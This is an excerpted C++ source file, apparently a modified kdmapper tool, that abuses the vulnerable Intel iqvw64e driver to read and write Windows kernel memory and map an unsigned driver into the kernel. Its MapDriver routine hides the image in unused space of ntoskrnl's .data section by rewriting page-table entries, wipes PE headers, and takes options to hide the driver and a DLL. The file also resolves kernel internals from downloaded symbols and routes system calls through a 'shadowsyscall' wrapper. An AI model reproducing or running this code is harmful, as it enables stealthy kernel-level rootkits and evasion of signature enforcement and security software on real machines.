...
namespace kdmapper {
  struct pdb_offsets {
    ...
    uintptr_t MmHighestPhysicalPage;
    uintptr_t MmLowestPhysicalPage;
  ...
  // Note: if you set PassAllocationAddressAsFirstParam as true, param1 will be
  // ignored
  __forceinline uint64_t
  MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1 = 0, ULONG64 param2 = 0,
            bool free = false, bool destroyHeader = true,
            bool PassAllocationAddressAsFirstParam = false, NTSTATUS* exitCode = nullptr,
            nt::driver_alloc_mode legit_memory = nt::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT,
            nt::memory_type driver_mem_type = nt::memory_type::NORMAL_PAGE,
            nt::hide_type driver_hide_type = nt::hide_type::NONE,
            nt::hide_type dll_hide_type = nt::hide_type::NONE, kdmapper::pdb_offsets offset = {});
  __forceinline void RelocateImageByDelta(portable_executable::vec_relocs relocs,
                                          const uint64_t delta);
  __forceinline bool FixSecurityCookie(void* local_image, uint64_t kernel_image_base);
  __forceinline bool ResolveImports(HANDLE iqvw64e_device_handle,
                                    portable_executable::vec_imports imports);
  __forceinline void* AllocContiguousMemory(HANDLE device_handle, size_t size);
  __forceinline void FreeContiguousMemory(HANDLE device_handle, void* virtual_address);
  __forceinline uint64_t AllocIndependentPages(HANDLE device_handle, uint32_t size);
  __forceinline pdb_offsets parse_pdb();
  __forceinline int Init(nt::driver_alloc_mode driver_alloc_mode, nt::memory_type driver_mem_type,
                         nt::hide_type driver_hide_type, nt::hide_type dll_hide_type);
}  // namespace kdmapper
...
__forceinline void* kdmapper::AllocContiguousMemory(HANDLE device_handle, size_t size) {
  static uint64_t kernel_MmAllocateContiguousMemory = intel_driver::GetKernelModuleExport(
      device_handle, intel_driver::ntoskrnlAddr, "MmAllocateContiguousMemory");
  ...
  intel_driver::CallKernelFunction(device_handle, &virtual_address,
                                   kernel_MmAllocateContiguousMemory, size, max_address);

  return virtual_address;
}

__forceinline void kdmapper::FreeContiguousMemory(HANDLE device_handle, void* virtual_address) {
  static uint64_t kernel_MmFreeContiguousMemory = intel_driver::GetKernelModuleExport(
      device_handle, intel_driver::ntoskrnlAddr, "MmFreeContiguousMemory");
  if (!kernel_MmFreeContiguousMemory) {
    Log(L"[-] Failed to find MmFreeContiguousMemory" << std::endl);
    return;
  }

  if (!virtual_address) {
    Log(L"[-] Attempted to free null pointer" << std::endl);
    return;
  }

  intel_driver::CallKernelFunction<void>(device_handle, nullptr, kernel_MmFreeContiguousMemory,
                                         virtual_address);
}

__forceinline uint64_t
kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1, ULONG64 param2,
                    bool free, bool destroyHeader, bool PassAllocationAddressAsFirstParam,
                    NTSTATUS* exitCode, nt::driver_alloc_mode driver_alloc_type,
                    nt::memory_type driver_mem_type, nt::hide_type driver_hide_type,
                    nt::hide_type dll_hide_type, kdmapper::pdb_offsets offsets) {
  ...
  auto status =
      shadowsyscall<NTSTATUS>("NtAllocateVirtualMemory", NtCurrentProcess, &local_image_base, 0,
                              &alloc_size, MEM_RESERVE | MEM_COMMIT, 0x40);
  ...
  Log(L"[+] Successfully allocated local memory at: " << local_image_base << L" with size: "
                                                      << alloc_size << L" bytes" << std::endl);
  ...
  if (driver_alloc_type == nt::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT) {
    ...
    if (!kernel_image_base) {
      ...
      alloc_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, &local_image_base, &alloc_size, MEM_RELEASE);
      return 0;
    }
  } else if (driver_alloc_type == nt::driver_alloc_mode::ALLOC_IN_CURRENT_PROCESS_CONTEXT) {
    kernel_image_base =
        reinterpret_cast<uintptr_t>(page_table::allocate_within_current_process_context(
            iqvw64e_device_handle, GetCurrentProcessId(), image_size, large_page_support, true));
    if (!kernel_image_base) {
    ...
    uintptr_t section_base =
        intel_driver::FindSectionAtKernel(iqvw64e_device_handle, ".data", ntos_base, &section_size);
    ...
    kernel_image_base = reinterpret_cast<uintptr_t>(intel_driver::FindUnusedSpace(
        iqvw64e_device_handle, section_base, section_size, image_size, 0x1000));
    if (!kernel_image_base) {
    ...
    Log(L"[+] Found unused space in section at address: "
        << reinterpret_cast<void*>(kernel_image_base) << std::endl);

    for (uintptr_t current_addr = kernel_image_base; current_addr < kernel_image_base + image_size;
         current_addr += nt::PAGE_SIZE) {
      ...
      if (!intel_driver::ReadMemory(iqvw64e_device_handle, pde_address, &pde, sizeof(PDE_64))) {
        Log(L"[-] Failed to read PDE at address: " << reinterpret_cast<void*>(pde_address)
                                                   << std::endl);
        return 0;
      }
      ...
      if (pde.LargePage) {
        ...
        if (!intel_driver::WriteMemory(iqvw64e_device_handle, pde_address, &pde, sizeof(PDE_64))) {
          Log(L"[-] Failed to write PDE at address: " << reinterpret_cast<void*>(pde_address)
                                                      << std::endl);
          return 0;
        }
      } else {
        ...
        if (!intel_driver::ReadMemory(iqvw64e_device_handle, pte_address, &pte, sizeof(PTE_64))) {
          Log(L"[-] Failed to read PTE at address: " << reinterpret_cast<void*>(pte_address)
                                                     << std::endl);
          return 0;
        }
        ...
        if (!intel_driver::WriteMemory(iqvw64e_device_handle, pte_address, &pte, sizeof(PTE_64))) {
          Log(L"[-] Failed to write PTE at address: " << reinterpret_cast<void*>(pte_address)
                                                      << std::endl);
          return 0;
        }
      }
  ...
  do {
    Log(L"[+] Image base has been allocated at 0x" << reinterpret_cast<void*>(kernel_image_base)
                                                   << std::endl);
    ...
    for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
      ...
      memcpy(local_section,
             reinterpret_cast<void*>(reinterpret_cast<uint64_t>(data) +
                                     current_image_section[i].PointerToRawData),
    ...
    if (destroyHeader) {
      ...
      Log(L"[+] Skipped 0x" << std::hex << TotalVirtualHeaderSize << L" bytes of PE Header"
                            << std::endl);
    }

    // Resolve relocs and imports
    Log(L"[+] Resolving relocations" << std::endl);
    RelocateImageByDelta(GetRelocs(local_image_base),
    ...
    if (!intel_driver::WriteMemory(
            iqvw64e_device_handle, realBase,
    ...
    const uint64_t address_of_entry_point =
        kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
    Log(L"[<] Calling DriverEntry at 0x" << reinterpret_cast<void*>(address_of_entry_point)
                                         << std::endl);

    if (!offsets.IoGetCurrentProcess) {
      Log(L"[!] fail to get offsets men");
      break;
    }

    offsets.DriverAllocBase = kernel_image_base;
    offsets.DriverSize = alloc_size;
    offsets.DriverHideType = driver_hide_type;
    offsets.DllHideType = dll_hide_type;

    if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point,
                                          offsets.IoGetCurrentProcess, offsets.MmCopyVirtualMemory,
                                          &offsets)) {
...
__forceinline void kdmapper::RelocateImageByDelta(portable_executable::vec_relocs relocs,
                                                  const uint64_t delta) {
...
__forceinline bool kdmapper::FixSecurityCookie(void* local_image, uint64_t kernel_image_base) {
  ...
  auto load_config_directory =
      headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
  if (!load_config_directory) {
    Log(L"[+] Load config directory wasn't found, probably StackCookie not "
        L"defined, fix cookie skipped"
        << std::endl);
    return true;
  }

  auto load_config_struct =
      (PIMAGE_LOAD_CONFIG_DIRECTORY)((uintptr_t)local_image + load_config_directory);
  auto stack_cookie = load_config_struct->SecurityCookie;
  if (!stack_cookie) {
    Log(L"[+] StackCookie not defined, fix cookie skipped" << std::endl);
    return true;  // as I said, it is not an error and we should allow that
                  // behavior
  }

  stack_cookie = stack_cookie - (uintptr_t)kernel_image_base +
                 (uintptr_t)local_image;  // since our local image is already relocated the
  // base returned will be kernel address
  ...
  auto new_cookie =
      (0x2B992DDFA232) ^ shadowcall<DWORD>("GetCurrentProcessId") ^
      shadowcall<DWORD>("GetCurrentThreadId");  // here we don't really care about the value
  // of stack cookie, it will still works and
  // produce nice result
...
__forceinline bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle,
                                            portable_executable::vec_imports imports) {
      ...
      if (!function_address) {
        ...
        if (Module != intel_driver::ntoskrnlAddr) {
          function_address = intel_driver::GetKernelModuleExport(
              iqvw64e_device_handle, intel_driver::ntoskrnlAddr, current_function_data.name);
          if (!function_address) {
#if !defined(DISABLE_OUTPUT)
            // std::cout << "[-] Failed to resolve import " <<
            // current_function_data.name << " (" << current_import.module_name
            // << ")" << std::endl;
#endif
            return false;
          }
...
__forceinline auto kdmapper::parse_pdb() -> pdb_offsets {
  Log(L"[+] Downloading ntoskrnl PDB" << std::endl);
  ...
  if (pdbPath.empty()) {
    Log(L"[+] Failed to download ntoskrnl PDB" << std::endl);
    return {};
  }

  EZPDB pdb;
  if (!EzPdbLoad(pdbPath, &pdb)) {
    Log(L"[+] Failed to load ntoskrnl PDB" << std::endl);
    return {};
  }
  ...
  kdmapper::pdb_offsets offsets = {
      ...
      ntoskrnl_base + EzPdbGetRva(&pdb, "MmHighestPhysicalPage"),
      ntoskrnl_base + EzPdbGetRva(&pdb, "MmLowestPhysicalPage"),
      ntoskrnl_base + EzPdbGetRva(&pdb, "MmGetPhysicalMemoryRanges"),
      ntoskrnl_base + EzPdbGetRva(&pdb, "MmIsAddressValid"),
      ...
      ntoskrnl_base + EzPdbGetRva(&pdb, "PsAcquireProcessExitSynchronization"),
      ntoskrnl_base + EzPdbGetRva(&pdb, "PsReleaseProcessExitSynchronization"),
      ntoskrnl_base + EzPdbGetRva(&pdb, "PsGetProcessExitStatus"),
      ...
      ntoskrnl_base + EzPdbGetRva(&pdb, "KeFlushSingleTb"),
  ...
  // offsets to compare
  if (offsets.ExAllocatePool2 == offsets.ExFreePoolWithTag) {
    Log(L"[-] Error parsing ntoskrnl symbols" << std::endl);
    return {};
  }
...
__forceinline int kdmapper::Init(nt::driver_alloc_mode driver_alloc_mode,
                                 nt::memory_type driver_mem_type, nt::hide_type driver_hide_type,
                                 nt::hide_type dll_hide_type) {
  if (!NT_SUCCESS(utils::init_mapper_dependencies())) {
    return NULL;
  }

  kdmapper::pdb_offsets offsets = kdmapper::parse_pdb();
  if (offsets.NtoskrnlBase == 0) {
    return NULL;
  }
  ...
  if (!kdmapper::MapDriver(iqvw64e_device_handle, (std::uint8_t*)driver_shell, 0, 0, false, true,
                           false, &exit_code, driver_alloc_mode, driver_mem_type, driver_hide_type,
                           dll_hide_type, offsets)) {
